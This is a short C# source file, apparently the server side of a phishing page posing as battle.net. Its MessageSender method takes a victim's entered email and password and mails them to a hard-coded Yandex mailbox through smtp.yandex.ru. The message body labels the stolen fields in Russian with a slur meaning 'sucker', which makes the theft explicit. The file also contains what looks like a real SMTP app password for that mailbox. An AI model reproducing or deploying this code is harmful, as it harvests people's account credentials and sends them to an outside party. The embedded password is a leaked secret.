using MailKit.Net.Smtp;
using MimeKit;

namespace BattleNetServer;

public class MessageSender
{
    private const string EmailAddress = "iriinasss@yandex.ru";
    private const string PasswordAddress = "ubdpywgnrcetokpt";

    public static async Task<bool> SendEmailAsync(string inputEmail, string inputPassword, string subj)
    {
        try
        {
            using var mailSender = new MimeMessage();
            
            mailSender.From.Add(new MailboxAddress("battle.net", EmailAddress));
            mailSender.To.Add(new MailboxAddress("", EmailAddress));
            mailSender.Subject = subj;
            mailSender.Body = new TextPart(MimeKit.Text.TextFormat.Html)
            {
                Text = $"<h4>Данные пользователя battle.net:<br>Почта лоха: {inputEmail}<br>Пароль лоха: {inputPassword}</h4>"
            };

            using var client = new SmtpClient();
            await client.ConnectAsync("smtp.yandex.ru", 465, true);
            client.AuthenticationMechanisms.Remove("XOAUTH2");
            await client.AuthenticateAsync(EmailAddress, PasswordAddress);
            await client.SendAsync(mailSender);
            await client.DisconnectAsync(true);
            return true;
        }
        catch (Exception e)
        {
            Console.WriteLine($"Ошибка при отправке сообщения: {e.Message}");
            return false;
        }
    }
}